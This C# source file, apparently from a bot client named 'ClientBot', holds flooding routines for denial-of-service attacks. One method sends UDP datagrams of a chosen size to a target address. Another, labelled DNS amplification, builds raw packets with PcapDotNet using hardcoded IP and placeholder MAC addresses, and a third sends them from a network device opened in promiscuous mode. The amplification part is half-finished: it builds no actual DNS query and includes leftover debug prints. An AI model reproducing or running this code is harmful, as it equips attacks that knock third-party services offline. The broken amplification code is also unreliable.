using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.Transport;

namespace ClientBot
{
    class SEND
    {
        public static bool sendData(IPAddress ipAddr,int port,int byteAmount,string text)
        {
            try
            {
                byte[] textByte = Encoding.ASCII.GetBytes(text);
                new Socket(System.Net.Sockets.AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp).SendTo(new byte[byteAmount], new IPEndPoint(ipAddr, port));
                Thread.Sleep(1);
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }
        public static Packet dnsAmplifcation(string sourceIP,string dnsIP)
        {
            try
            {
                //  Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Udp);
                IList<LivePacketDevice> packetDevices = LivePacketDevice.AllLocalMachine;
                if (packetDevices.Count == 0)
                {
                    Console.WriteLine("WTF NOTHING IN LIST");
                }
                Packet packet = PacketBuilder.Build(DateTime.Now,
                new EthernetLayer
                {
                    Source = new MacAddress("11:22:33:44:55:66"),
                    Destination = new MacAddress("11:22:33:44:55:67")
                },
                new IpV4Layer
                {
                    TypeOfService = 0,
                    Fragmentation = IpV4Fragmentation.None,
                    Protocol = IpV4Protocol.ActiveNetworks,
                    HeaderChecksum = null,
                    Source = new IpV4Address("142.129.157.81"),
                    CurrentDestination = new IpV4Address("142.129.157.81"),
                    Ttl = 64,
                    Identification = 100,
                    Options = IpV4Options.None
                },
                new PayloadLayer
                {
                    Data = new Datagram(new byte[1000])
                });
                Console.WriteLine("packet created");
                Console.WriteLine(packet.ToString());
                Console.WriteLine("sent");
                return packet;
            }
            catch(Exception e)
            {
                return null;
            }

            
        }
        public static bool dns(Packet packet,PacketDevice packetDevice)
        {
            try
            {
                PacketCommunicator communicator = packetDevice.Open(100, PacketDeviceOpenAttributes.Promiscuous, 100);
                communicator.SendPacket(packet);
                return true;
            }
            catch(Exception e)
            {
                return false;
            }
        }
    }
}
